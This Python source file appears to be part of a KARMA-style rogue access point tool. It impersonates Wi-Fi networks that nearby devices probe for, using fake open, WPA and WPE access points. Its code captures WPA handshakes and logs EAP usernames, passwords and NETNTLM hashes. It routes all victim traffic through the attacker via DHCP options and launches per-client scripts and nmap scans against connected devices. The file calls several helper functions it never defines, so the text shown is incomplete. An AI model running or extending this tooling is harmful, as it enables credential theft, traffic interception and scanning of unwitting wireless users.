#!/usr/bin/python3
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from mac_vendor_lookup import MacLookup # pip3 install mac-vendor-lookup
from netaddr import IPNetwork, IPAddress
import os
import random
import subprocess
from signal import SIGTERM, SIGINT, signal as signal_register
from time import sleep, time
from datetime import datetime
from threading import Thread
from colorama import Fore
from getkey import getkey
import argparse


TIMEOUT = 20
TIMEOUT_CLIENT_RECONNECT = 5

# AC monitoring — used when --ac-essid flag is passed
AC_ESSID = "DefaultSSID"
AC_PSK   = "1234567890"
CHANNEL_HOPPING_TIMEOUT = 2
CLIENT_MONITOR_TIMEOUT = 2
network_scenarios = []
client_scenarios = []
handshake_scenarios = []
oui = MacLookup()
conf.verb = 0
is_exit = False

def on_probe(essid, sta, freq, signal, vendor):
	for cwd,directories,files in os.walk("on_probe"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				subprocess.Popen(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"', shell=True, preexec_fn=os.setsid)

def on_network(essid, iface):
	if args.ac_essid:
		DEBUG("[ac-essid] skip all on_network scripts")
		return
	for cwd,directories,files in os.walk("on_network"):
		for file in files:
			script = os.path.join(cwd, file)
			if not os.access(script, os.X_OK):
				continue
			DEBUG(f'{script} {iface} "{essid}"')
			network_scenarios.append( subprocess.Popen(f'{script} {iface} "{essid}"', shell=True, preexec_fn=os.setsid) )

def on_client(ip, mac, attacker_ip):
	client_mac_to_ip[mac] = ip   # remember IP so _drop_client can clear OPN known_targets
	vendor = lookup(mac)
	print(Fore.LIGHTRED_EX + "\n  ┌─────────────────────────────────────────────┐")
	print(f"  │  ▶ CLIENT CONNECTED                         │")
	print(f"  │    IP      : {ip:<32}│")
	print(f"  │    MAC     : {mac:<32}│")
	print(f"  │    Vendor  : {vendor[:32]:<32}│")
	print(f"  │    Attacker: {attacker_ip:<32}│")
	print("  └─────────────────────────────────────────────┘" + Fore.RESET)
	procs = []
	for cwd,directories,files in os.walk("on_client"):
		for file in sorted(files):
			script = os.path.join(cwd, file)
			if not os.access(script, os.X_OK):
				continue

			is_fetch_ac = "fetch_ac" in file
			is_nmap     = "nmap"     in file.lower()

			if args.ac_essid:
				# AC mode: only fetch_ac + nmap, skip everything else
				if not is_fetch_ac and not is_nmap:
					DEBUG(f"[ac-essid] skip {script}")
					continue
			else:
				# Normal mode: skip fetch_ac (not relevant without AC network)
				if is_fetch_ac:
					DEBUG(f"[ac-essid] skip {script} (use --ac-essid to enable)")
					continue

			DEBUG(f"{script} {ip} {mac} {attacker_ip}")
			p = subprocess.Popen(f"{script} {ip} {mac} {attacker_ip}", shell=True, preexec_fn=os.setsid)
			client_scenarios.append(p)
			procs.append(p)
	if procs:
		client_pids[mac] = procs

def on_handshake(pcap, essid, bssid):
	for cwd,directories,files in os.walk("on_handshake"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				DEBUG(f'{script} "{pcap}" "{essid}" {bssid}')
				handshake_scenarios.append( subprocess.Popen(f'{script} "{pcap}" "{essid}" {bssid}', shell=True, preexec_fn=os.setsid) )

passwords = {}
def update_handshakes_info():
	global passwords, known_essids
	passwords_new = {}
	for cwd,directories,files in os.walk("handshakes"):
		for file in files:
			if file.endswith(".txt"):
				essid = file[:-4]
				if not passwords.get(essid):
					password = open(os.path.join(cwd, file)).read()
					if password:
						passwords[essid] = password
						passwords_new[essid] = password
						if essid in known_essids:
							known_essids.remove(essid)
	return passwords_new

def stop_scenarios():
	for scenario in network_scenarios + client_scenarios + handshake_scenarios:
		try:
			os.killpg(os.getpgid(scenario.pid), SIGTERM)
			DEBUG(f"stop scenario {scenario.args}")
		except (ProcessLookupError, OSError):
			pass   # process already exited
	network_scenarios.clear()
	client_scenarios.clear()
	handshake_scenarios.clear()
	client_pids.clear()
	client_mac_to_ip.clear()

def stop_APs():
	print("stopping APs...")
	if hostapd_opn:
		if hostapd_opn.dhcpd:
			hostapd_opn.dhcpd.stop()
		hostapd_opn.shutdown()
	if hostapd_wpa:
		if hostapd_wpa.dhcpd:
			hostapd_wpa.dhcpd.stop()
		hostapd_wpa.shutdown()
	if hostapd_wpe:
		hostapd_wpe.shutdown()
	stop_scenarios()

def control():
	global probes, is_exit
	while True:
		cmd = getkey()
		if cmd == "h":
			print("h -	show help")
			print("p -	print Probes")
			print("s -	force stop APs")
			print("q -	exit")
		elif cmd == "p":
			for essid in probes:
				print("{essid} {clients}".format(essid=essid, clients=",".join(probes[essid])))
		elif cmd == "s":
			stop_APs()
		elif cmd in ("q", "\x03"):   # q or Ctrl+C in raw-mode terminal
			stop_APs()
			print("exiting...")
			is_exit = True
			break

def DEBUG(msg, end='\n'):
	if args.d:
		print(Fore.LIGHTBLACK_EX + "[.] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO(msg, end='\n'):
	print(Fore.LIGHTBLUE_EX + "[*] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO2(msg, end='\n'):
	print(Fore.BLUE + "[*] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO3(msg, end='\n'):
	print(Fore.BLUE + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def NOTICE(msg, end='\n'):
	print(Fore.LIGHTCYAN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def WARN(msg, end='\n'):
	print(Fore.LIGHTGREEN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def CRIT(msg, end='\n'):
	print(Fore.LIGHTRED_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def ERROR(msg, end='\n'):
	print(Fore.RESET + "[!] [{time}] {msg}".format(time=get_time(), msg=msg), end=end)

class Hostapd:
	config = ''
	file = ''
	name = ''
	binary = ''
	def __init__(self, iface, essid, password):
		self.iface = iface
		self.essid = essid
		self.password = password or 'impossible_to_guess'
		self.is_up = False
		self.is_shutdown = False
		self.clients = {}
		with open(self.file, "w") as f:
			f.write(self.config.format(iface=self.iface, essid=self.essid, password=self.password))
#		DEBUG("ifconfig {iface} up".format(iface=self.iface))
#		os.system("ifconfig {iface} up".format(iface=self.iface))
		self.hostapd = subprocess.Popen([self.binary, self.file], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
		self.__status_thr = Thread(target=self.status)
		self.__client_monitor_thr = Thread(target=self.client_monitor)
		self.__status_thr.start()
		self.__client_monitor_thr.start()
		self.dhcpd = None
		self.network = None

	def wait(self, max_waiting_time):
		begin = time()
		while not self.is_up:
			sleep(0.1)
			if time() - begin > max_waiting_time:
				break
	
	def shutdown(self):
		self.is_shutdown = True
		self.hostapd.terminate()
		sleep(1)
		self.hostapd.kill()
		self.hostapd.wait()
#		os.system("ifconfig {iface} down".format(iface=self.iface))
#		DEBUG("ifconfig {iface} down".format(iface=self.iface))

	def status(self):
		while not self.is_shutdown:
			line = self.hostapd.stdout.readline()
			if not line:
				if self.is_shutdown:
					break
				sleep(0.2)
				continue
			DEBUG(line)
			line = line.decode("utf-8")
			if line.find("AP-ENABLED") != -1:
				self.is_up = True
			elif line.find("AP-DISABLED") != -1:
				self.is_up = False
			elif line.find("AP-STA-CONNECTED") != -1:
				client = line.split()[2]
				vendor = lookup(client)
				NOTICE("[{hostapd}] client {client} ({vendor}) connected".format(hostapd=self.name, client=client, vendor=vendor))
			elif line.find("AP-STA-DISCONNECTED") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))

	def client_monitor(self):
		prev_macs = set()
		while not self.is_shutdown:
			if not self.is_up:
				sleep(0.2)
				continue
			current_clients = {}
			try:
				for line in subprocess.check_output("iw dev {iface} station dump".format(iface=self.iface).split()).split(b"\n"):
					line = line.decode("utf-8")
					if line.find('Station') != -1:
						client = line.split()[1]
					elif line.find('signal:') != -1:
						signal = line.split()[1]
						current_clients[client] = signal
			except Exception:
				pass

			# Clients that vanished since last poll — kill their scripts immediately
			gone = prev_macs - set(current_clients.keys())
			for mac in gone:
				vendor = lookup(mac)
				CRIT(f"[{self.name}] ✗ {mac} ({vendor}) — disconnected")
				_drop_client(mac)

			# Only announce newly-seen clients (suppress per-poll signal spam)
			new_macs = set(current_clients.keys()) - prev_macs
			for mac in new_macs:
				rx = current_clients.get(mac, "?")
				rx_str = "N/A" if rx in ("0", "0.0", "?") else f"{rx} dBm"
				vendor = lookup(mac)
				NOTICE(f"[{self.name}] ✔ {mac} ({vendor})  signal: {rx_str}")

			prev_macs = set(current_clients.keys())
			self.clients = current_clients
			for _ in range(CLIENT_MONITOR_TIMEOUT * 5):  # sleep in 0.2s steps to react fast
				if self.is_shutdown:
					return
				sleep(0.2)

	def change_network_settings(self, network):
		self.network = IPNetwork(network)
		ip_cidr = str(self.network.cidr).replace(str(self.network.network), str(self.network[1]))
		# Flush existing addresses and set new one — use both ip and ifconfig for compatibility
		os.system("ip addr flush dev {iface} 2>/dev/null".format(iface=self.iface))
		ret = os.system("ip addr add {ip_cidr} dev {iface} 2>/dev/null".format(ip_cidr=ip_cidr, iface=self.iface))
		if ret != 0:
			os.system("ifconfig {iface} {ip} netmask {mask} 2>/dev/null".format(
				iface=self.iface,
				ip=str(self.network[1]),
				mask=str(self.network.netmask)))
		os.system("ip link set {iface} up 2>/dev/null".format(iface=self.iface))
		os.system("ip r add {network} dev {iface} table 1033 2>/dev/null".format(iface=self.iface, network=str(self.network.cidr)))
		os.system("ip rule add to {network} lookup 1033 2>/dev/null".format(iface=self.iface, network=str(self.network.cidr)))
		print(f"  [NET] {self.iface} → {ip_cidr}")


class Hostapd_OPN(Hostapd):
	binary = 'hostapd'
	name = "OPN"
	file = "/tmp/ap_opn.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''

class Hostapd_WPA(Hostapd):
	binary = 'hostapd'
	name = "WPA"
	file = "/tmp/ap_wpa.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase={password}
'''

class Hostapd_WPE(Hostapd):
	binary = 'hostapd-eaphammer'
	name = "EAP"
	file = "/tmp/ap_wpe.conf"
	config = '''interface={iface}
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
ssid={essid}
channel=1
hw_mode=g
eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
ctrl_interface=/var/run/hostapd-wpe
ctrl_interface_group=0
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=-1
fragm_threshold=-1
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
wmm_enabled=1
wmm_ac_bk_cwmin=4
wmm_ac_bk_cwmax=10
wmm_ac_bk_aifs=7
wmm_ac_bk_txop_limit=0
wmm_ac_bk_acm=0
wmm_ac_be_aifs=3
wmm_ac_be_cwmin=4
wmm_ac_be_cwmax=10
wmm_ac_be_txop_limit=0
wmm_ac_be_acm=0
wmm_ac_vi_aifs=2
wmm_ac_vi_cwmin=3
wmm_ac_vi_cwmax=4
wmm_ac_vi_txop_limit=94
wmm_ac_vi_acm=0
wmm_ac_vo_aifs=2
wmm_ac_vo_cwmin=2
wmm_ac_vo_cwmax=3
wmm_ac_vo_txop_limit=47
wmm_ac_vo_acm=0
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
'''
	def client_monitor(self):
		pass

	def status(self):
		while not self.is_shutdown:
			line = self.hostapd.stdout.readline()
			if not line:
				if self.is_shutdown:
					break
				sleep(0.2)
				continue
			DEBUG(line)
			line = line.decode("utf-8")
			if line.find("AP-ENABLED") != -1:
				self.is_up = True
			elif line.find("AP-DISABLED") != -1:
				self.is_up = False
			elif line.find("STA") != -1 and line.find('associated') != -1:
				client = line.split()[2]
				vendor = lookup(client)
				NOTICE("[{hostapd}] client {client} ({vendor}) connected".format(hostapd=self.name, client=client, vendor=vendor))
			elif line.find("deauthenticated") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))
			elif line.find("username:") != -1 or line.find("password:") != -1 or line.find("NETNTLM:") != -1:
				CRIT("[{hostapd}] {line}".format(hostapd=self.name, line=line.split('\n')[0]))

class DHCPD:
	file       = "/tmp/dhcp_{iface}.conf"
	lease_file = "/tmp/dhcp_{iface}.leases"
	hook_file  = "/tmp/karma_dhcp_hook.sh"
	config = '''domain=fake.net
interface={iface}
dhcp-range={ip_start},{ip_end},5m
dhcp-leasefile={lease_file}
dhcp-script={hook_file}
dhcp-option=1,{mask}
dhcp-option=3,{ip_gw}
dhcp-option=6,8.8.8.8,8.8.4.4
dhcp-option=121,0.0.0.0/1,{ip_gw},128.0.0.0/1,{ip_gw}
dhcp-option=249,0.0.0.0/1,{ip_gw},128.0.0.0/1,{ip_gw}
'''
	def __init__(self, iface, network):
		self.iface = iface
		net = IPNetwork(network)
		self.ip_start  = str(net[2])
		self.ip_end    = str(net[200])
		self.mask      = str(net.netmask)
		self.ip_gw     = str(net[1])
		self.is_up     = False
		self.is_shutdown = False
		self.clients   = {}
		self.file       = self.file.format(iface=iface)
		self.lease_file = self.lease_file.format(iface=iface)
		# Write dhcp-script hook that fires immediately on IP assignment
		karma_out = os.environ.get('KARMA_OUT', '/tmp')
		hook_script = f"""#!/bin/bash
# Called by dnsmasq: add|del|old <mac> <ip> [hostname]
ACTION="$1"; MAC="$2"; IP="$3"
IFACE="{self.iface}"
OUT="{karma_out}"
DBG="$OUT/karma_debug.log"
ts=$(date +'%H:%M:%S')
echo "[$ts] [DHCP-HOOK] action=$ACTION mac=$MAC ip=$IP" >> "$DBG"
[[ "$ACTION" == "add" || "$ACTION" == "old" ]] || exit 0
[[ -z "$IP" ]] && exit 0
# Write for Dart pipeline trigger
grep -qxF "$IP" "$OUT/karma_clients.txt" 2>/dev/null || echo "$IP" >> "$OUT/karma_clients.txt"
# Write ip:mac mapping for karma.py poll
echo "$IP $MAC" >> "$OUT/karma_dhcp.txt"
# Pin permanent ARP entry so route stays alive during pipeline scans
ip neigh replace "$IP" lladdr "$MAC" dev "$IFACE" nud permanent 2>/dev/null \
  && echo "[$ts] [DHCP-HOOK] ARP pinned $IP -> $MAC on $IFACE" >> "$DBG" \
  || echo "[$ts] [DHCP-HOOK] ARP pin failed for $IP" >> "$DBG"
echo "[$ts] [DHCP-HOOK] wrote $IP to karma_clients.txt + karma_dhcp.txt" >> "$DBG"
"""
		with open(self.hook_file, "w") as f:
			f.write(hook_script)
		os.system(f"chmod +x {self.hook_file}")
		with open(self.file, "w") as f:
			f.write(self.config.format(
				iface=self.iface, ip_start=self.ip_start, ip_end=self.ip_end,
				mask=self.mask, ip_gw=self.ip_gw,
				lease_file=self.lease_file, hook_file=self.hook_file))
		self.dhcpd = subprocess.Popen(["dnsmasq", "--conf-file="+self.file, "-d", "-p0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	def stop(self):
		self.is_shutdown = True
		self.dhcpd.terminate()
		sleep(1)
		#self.dhcpd.kill()
		self.dhcpd.wait()

def get_time():
	return datetime.now().strftime("%H:%M:%S")

def get_mac():
	return Ether().src

def get_password(essid):
	try:
		return open(os.path.join("handshakes","%s.txt"%essid)).read()
	except:
		return ""

def lookup(mac):
	try:
		return oui.lookup(mac)
	except:
		return 'unknown'

def _classify_vendor(vendor: str) -> str:
	"""Map OUI vendor string to a short human-readable device category."""
	v = vendor.lower()
	if 'apple' in v:
		return 'Apple'
	if any(x in v for x in ('samsung', 'xiaomi', 'huawei', 'oppo', 'oneplus', 'vivo', 'realme',
	                         'motorola', 'google', 'nothing tech', 'fairphone')):
		return 'Android'
	if any(x in v for x in ('intel corp', 'realtek semi', 'broadcom', 'azurewave',
	                         'murata', 'lite-on', 'dell', 'hp inc', 'hewlett', 'acer', 'asus')):
		return 'Laptop'
	if any(x in v for x in ('cisco', 'mikrotik', 'tp-link', 'netgear', 'd-link',
	                         'ubiquiti', 'juniper', 'aruba', 'ruckus', 'zyxel', 'fortinet')):
		return 'Router'
	if any(x in v for x in ('hikvision', 'dahua', 'axis comm', 'vivotek', 'hanwha', 'bosch security')):
		return 'Camera'
	if any(x in v for x in ('espressif', 'raspberry', 'arduino', 'nordic semi', 'particle')):
		return 'IoT'
	return ''

def _is_corporate_ssid(essid: str) -> bool:
	"""Heuristic: SSID name looks like a corporate/enterprise network."""
	e = essid.lower()
	return any(kw in e for kw in (
		'corp', 'corporate', 'enterprise', 'office', 'eduroam',
		'radius', '802.1x', 'staff', 'employee', 'internal',
		'intranet', 'business', 'faculty', 'workplace', 'vpn',
		'secure-net', 'guest-corp', 'byod', 'mdm',
	))

def _probe_security(pkt) -> str:
	"""Best-effort security preference from probe request IEs.
	Many clients omit RSN/WPA IE from probe frames — result is indicative only."""
	elt = pkt.getlayer(Dot11Elt)
	while elt and isinstance(elt, Dot11Elt):
		if elt.ID == 48:  # RSN IE → WPA2
			raw = bytes(elt.info) if elt.info else b''
			try:
				if len(raw) >= 8:
					# version(2) + group_cipher(4) = 6; then pairwise count(2)
					pw_count = int.from_bytes(raw[6:8], 'little')
					off = 8 + pw_count * 4
					if len(raw) >= off + 2:
						akm_count = int.from_bytes(raw[off:off+2], 'little')
						off += 2
						if akm_count > 0 and len(raw) >= off + 4:
							akm_type = raw[off + 3]
							if akm_type == 1:
								return 'WPA2-EAP?'
							if akm_type == 2:
								return 'WPA2-PSK?'
			except Exception:
				pass
			return 'WPA2?'
		if elt.ID == 221:  # Vendor Specific — check for WPA1 IE (OUI 00:50:f2 type 01)
			raw = bytes(elt.info) if elt.info else b''
			if raw[:3] == b'\x00\x50\xf2' and len(raw) >= 4 and raw[3] == 0x01:
				return 'WPA?'
		elt = elt.payload if isinstance(getattr(elt, 'payload', None), Dot11Elt) else None
	return 'OPN?'


def try_to_start_hostapd(Hostapd, iface, essid, password, max_attempts=5):
	attempt = 0
	while attempt <= max_attempts:
		attempt += 1
		DEBUG("Try to start \"{essid}\" attempt {n}".format(essid=essid, n=attempt))
		hostapd = Hostapd(iface, essid, password)
		hostapd.wait(5)
		if hostapd.is_up:
			break
		else:
			DEBUG("Error starting {hostapd}. Starting again".format(hostapd=Hostapd.__name__))
			hostapd.shutdown()
			sleep(1)
			continue
	return hostapd

hostapd_opn = None
hostapd_opn_is_start = False
hostapd_wpa = None
hostapd_wpa_is_start = False
hostapd_wpe = None
hostapd_wpe_is_start = False
victim_trafic = PacketList()
def start_AP_OPN(iface, essid):
	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, known_targets

	if hostapd_opn_is_start:
		return
	hostapd_opn_is_start = True

	hostapd_opn = try_to_start_hostapd(Hostapd_OPN, iface, essid, password=False, max_attempts=5)
	if hostapd_opn.is_up:
		hostapd_opn.change_network_settings("10.0.0.1/24")
		hostapd_opn.dhcpd = DHCPD(iface, "10.0.0.1/24")
		INFO("run OPN network \"{essid}\" ({num})".format(num=pcap_no, essid=essid))
		on_network(essid, iface)
		begin = time()
		while time() - begin < TIMEOUT and not is_exit:
			try:
				victim_trafic = sniff(iface=iface, prn=parse_client_trafic_OPN, timeout=1,
				                      stop_filter=lambda p: is_exit)
			except:
				break
			if handshakes:
				break
		while hostapd_opn.clients and not handshakes and not is_exit:
			try:
				victim_trafic += sniff(iface=iface, prn=parse_client_trafic_OPN,
				                       timeout=TIMEOUT_CLIENT_RECONNECT,
				                       stop_filter=lambda p: is_exit)
			except:
				break
		hostapd_opn.dhcpd.stop()
		hostapd_opn.shutdown()
		stop_scenarios()
		#if victim_trafic:
		#	save(victim_trafic, network_name=essid)
		INFO("stop OPN network \"{essid}\"".format(essid=essid))
	else:
		hostapd_opn.shutdown()
		ERROR("network OPN \"{essid}\" wasn't started".format(essid=essid))

	hostapd_opn = None
	victim_trafic = PacketList()
	known_targets.clear()
	known_essids.discard(essid)
	hostapd_opn_is_start = False

handshakes = []
def start_AP_WPA(iface, essid):
	global hostapd_wpa, hostapd_wpa_is_start, handshakes, victim_trafic, known_targets

	if hostapd_wpa_is_start:
		return
	hostapd_wpa_is_start = True

	password = get_password(essid)
	hostapd_wpa = try_to_start_hostapd(Hostapd_WPA, iface, essid, args.psk or password, max_attempts=5)
	if hostapd_wpa.is_up:
		if args.psk or password:
			_dbg(f"[NET] setting {iface} → 12.0.0.1/24")
			hostapd_wpa.change_network_settings("12.0.0.1/24")
			_dbg(f"[DHCP] starting dnsmasq on {iface} range 12.0.0.2-200")
			hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
			_dbg(f"[DHCP] lease file → {hostapd_wpa.dhcpd.lease_file}")
		INFO("run WPA network \"{essid}\" \"{password}\" ({num})".format(num=pcap_no, essid=essid, password=args.psk or password))
		on_network(essid, iface)
		m1 = False
		m2 = False
		# Reset per-session state
		global _arping_done, _mac_first_seen, _arp_incomplete_probed, _alt_subnets_added
		_arping_done.clear()
		_mac_first_seen.clear()
		_arp_incomplete_probed.clear()
		_alt_subnets_added = False
		begin = time()
		while time() - begin < TIMEOUT and not is_exit:
			try:
				if not (args.psk or password):
					for p in sniff(iface=args.mon, filter="ether proto 0x888e", timeout=4,
					               stop_filter=lambda p: is_exit):
						if EAPOL in p and p[Dot11].addr3 == wpa_mac:
							handshakes.append(p)
							if p[Dot11].addr2 == wpa_mac:
								m1 = True
							elif p[Dot11].addr1 == wpa_mac:
								m2 = True
					if m1 and m2:
						WARN("handshake: %d EAPOL packets (M1/M2)" % len(handshakes))
						break
				else:
					# ── Watchdog: recover from hostapd crash or USB adapter reset ──────
					_hostapd_dead  = hostapd_wpa.hostapd.poll() is not None
					_iface_missing = not os.path.exists(f'/sys/class/net/{iface}')
					if (_hostapd_dead or _iface_missing) and not hostapd_wpa.is_shutdown:
						_dbg(f"[WATCHDOG] {'hostapd exited' if _hostapd_dead else 'interface gone'} — starting recovery")
						# Stop DHCP cleanly
						if hostapd_wpa.dhcpd:
							try: hostapd_wpa.dhcpd.stop()
							except Exception: pass
						hostapd_wpa.is_shutdown = True
						# Wait up to 30s for USB adapter to reappear after reset
						_iface_ok = os.path.exists(f'/sys/class/net/{iface}')
						if not _iface_ok:
							for _w in range(30):
								sleep(1)
								if os.path.exists(f'/sys/class/net/{iface}'):
									_iface_ok = True
									_dbg(f"[WATCHDOG] {iface} reappeared after {_w+1}s")
									break
								_dbg(f"[WATCHDOG] waiting for {iface}... {_w+1}s")
						if not _iface_ok:
							_dbg(f"[WATCHDOG] {iface} never came back — aborting")
							break
						# Re-initialize interface into clean managed state
						os.system(f"ip link set {iface} down 2>/dev/null")
						sleep(0.5)
						os.system(f"iw dev {iface} set type managed 2>/dev/null")
						sleep(0.5)
						os.system(f"ip link set {iface} up 2>/dev/null")
						sleep(2)
						# Restart hostapd
						_dbg(f"[WATCHDOG] restarting hostapd...")
						hostapd_wpa = try_to_start_hostapd(
							Hostapd_WPA, iface, essid, args.psk or password, max_attempts=3)
						if not hostapd_wpa.is_up:
							_dbg(f"[WATCHDOG] hostapd restart failed — retrying next cycle")
							sleep(3)
							continue
						# Restore IP + DHCP
						_dbg(f"[WATCHDOG] restoring network + dnsmasq")
						hostapd_wpa.change_network_settings("12.0.0.1/24")
						hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
						# Reset MAC timers so recovered clients don't instantly hit GIVEUP
						_mac_first_seen.clear()
						_arping_done.clear()
						_arp_incomplete_probed.clear()
						_dbg(f"[WATCHDOG] AP recovered — MAC timers reset, resuming client poll")

					# Poll connected stations — no scapy on AP interface (would kill hostapd)
					sleep(0.5 if args.ac_essid else 1)
					ip_gw   = hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else str(IPNetwork("12.0.0.1/24")[1])
					subnet  = str(hostapd_wpa.network.cidr) if hostapd_wpa.network else "12.0.0.0/24"

					# Step 1: probe any INCOMPLETE ARP entries to force MAC resolution
					_probe_incomplete_arps(iface)

					# Step 2: ARP cross-ref — find pending MACs that appear in complete ARP table
					pending_macs = [m for m in hostapd_wpa.clients if m not in known_targets]
					for arp_ip, arp_mac in _arp_complete_entries(iface).items():
						if arp_mac in pending_macs and arp_ip != ip_gw:
							vendor = lookup(arp_mac)
							NOTICE(Fore.GREEN + f"[AC] {arp_mac} ({vendor})  IP {arp_ip}  GW {ip_gw}" + Fore.RESET)
							_dbg(f"[ARP-XREF] {arp_mac} → {arp_ip} (complete ARP cross-ref)")
							_pin_arp(arp_ip, arp_mac, iface)
							known_targets.add(arp_mac)
							on_client(arp_ip, arp_mac, ip_gw)

					# Step 3: per-MAC poll (dhcp hook → lease → ARP → ip neigh → nmap → fallback)
					pending_macs = [m for m in hostapd_wpa.clients if m not in known_targets]
					for mac in pending_macs:
						if mac not in _mac_first_seen:
							_mac_first_seen[mac] = time()
							_dbg(f"[NEW] {mac} — first seen, awaiting DHCP hook or ARP")

						waited = time() - _mac_first_seen[mac]
						do_verbose = (waited < 2) or (int(waited) % 10 == 0)
						ip = _arp_lookup(mac, iface, verbose=do_verbose)

						# After 4s with no IP — active nmap of AP subnet (once per MAC)
						if not ip and mac not in _arping_done and waited > 4:
							_arping_done.add(mac)
							_dbg(f"[SCAN] {mac} — {waited:.0f}s no IP, nmap -sn {subnet}")
							subprocess.Popen(f"nmap -sn -n {subnet} >/dev/null 2>&1", shell=True)
							sleep(2)
							ip = _arp_lookup(mac, iface, verbose=True)

						# After 12s still no IP — client may have out-of-subnet static IP
						# Add common IoT static subnet aliases and scan those ranges
						if not ip and not _alt_subnets_added and waited > 12:
							_alt_subnets_added = True
							_dbg(f"[FALLBACK] {mac} — {waited:.0f}s no IP, adding static subnet aliases")
							for alias_net in ["192.168.0.1/24", "192.168.1.1/24", "10.0.0.1/24"]:
								os.system(f"ip addr add {alias_net} dev {iface} 2>/dev/null")
							sleep(1)
							subprocess.Popen(
								f"nmap -sn -n 192.168.0.0/24 192.168.1.0/24 10.0.0.0/24 >/dev/null 2>&1",
								shell=True)
							_dbg(f"[FALLBACK] scanning 192.168.0/24, 192.168.1/24, 10.0.0/24")
							sleep(3)
							ip = _arp_lookup(mac, iface, verbose=True)

						if not ip:
							# Give up after 60s — add to known_targets to stop polling
							if waited > 60:
								_dbg(f"[GIVEUP] {mac} — {waited:.0f}s no IP, giving up")
								known_targets.add(mac)
								continue
							if do_verbose: _dbg(f"[WAIT] {mac} — {waited:.0f}s elapsed, no IP")
							continue
						if ip == ip_gw:
							_dbg(f"[SKIP] {mac} → {ip} is gateway — ignoring")
							continue
						vendor = lookup(mac)
						NOTICE(Fore.GREEN + f"[AC] {mac} ({vendor})  IP {ip}  GW {ip_gw}" + Fore.RESET)
						_dbg(f"[FOUND] {mac} → {ip}")
						# Pin ARP entry permanently so kernel won't lose route while pipeline scans
						_pin_arp(ip, mac, iface)
						known_targets.add(mac)
						on_client(ip, mac, ip_gw)
			except Exception as e:
				print(str(e))
				continue
		if hostapd_wpa.dhcpd:
			hostapd_wpa.dhcpd.stop()
		hostapd_wpa.shutdown()
		# Clean up fallback subnet aliases if we added them
		if _alt_subnets_added:
			for alias_net in ["192.168.0.1/24", "192.168.1.1/24", "10.0.0.1/24"]:
				os.system(f"ip addr del {alias_net} dev {iface} 2>/dev/null")
			_alt_subnets_added = False
		if handshakes and not password:
			handshakes.append(get_beacon(essid))
			pcap = save(handshakes, network_name=os.path.join("handshakes", essid))
			if pcap:
				open(os.path.join("handshakes","%s.txt"%essid),"w").close()
				on_handshake(pcap, essid, get_mac())
		stop_scenarios()
		INFO("stop WPA network \"{essid}\"".format(essid=essid))
	else:
		hostapd_wpa.shutdown()
		ERROR("network WPA \"{essid}\" wasn't started".format(essid=essid))

	hostapd_wpa = None
	handshakes = []
	known_targets.clear()
	known_essids.discard(essid)
	hostapd_wpa_is_start = False

def start_AP_EAP(iface, essid):
	global hostapd_wpe, hostapd_wpe_is_start, known_targets

	if hostapd_wpe_is_start:
		return
	hostapd_wpe_is_start = True

	hostapd_wpe = try_to_start_hostapd(Hostapd_WPE, iface, essid, password=False, max_attempts=5)
	if hostapd_wpe.is_up:
		INFO("run EAP network \"{essid}\" ({num})".format(num=pcap_no, essid=essid))
		begin = time()
		while time() - begin < TIMEOUT: # waiting first client
			sleep(1)
			if handshakes: # if it was WPA network
				break
		hostapd_wpe.shutdown()
		INFO("stop EAP network \"{essid}\"".format(essid=essid))
	else:
		hostapd_wpe.shutdown()
		ERROR("network EAP \"{essid}\" wasn't started".format(essid=essid))

	hostapd_wpe = None
	known_targets.clear()
	known_essids.discard(essid)
	hostapd_wpe_is_start = False

def save(trafic, network_name):
	target_file = '%s.pcap' % network_name
	if not os.path.isfile(target_file):
		wrpcap(target_file, trafic)
		return '%s.pcap'%network_name

probes = {}
def statistics(sta, essid):
	global probes
	if not essid in probes:
		probes[essid] = set([sta])
		return True
	else:
		probes[essid].add(sta)
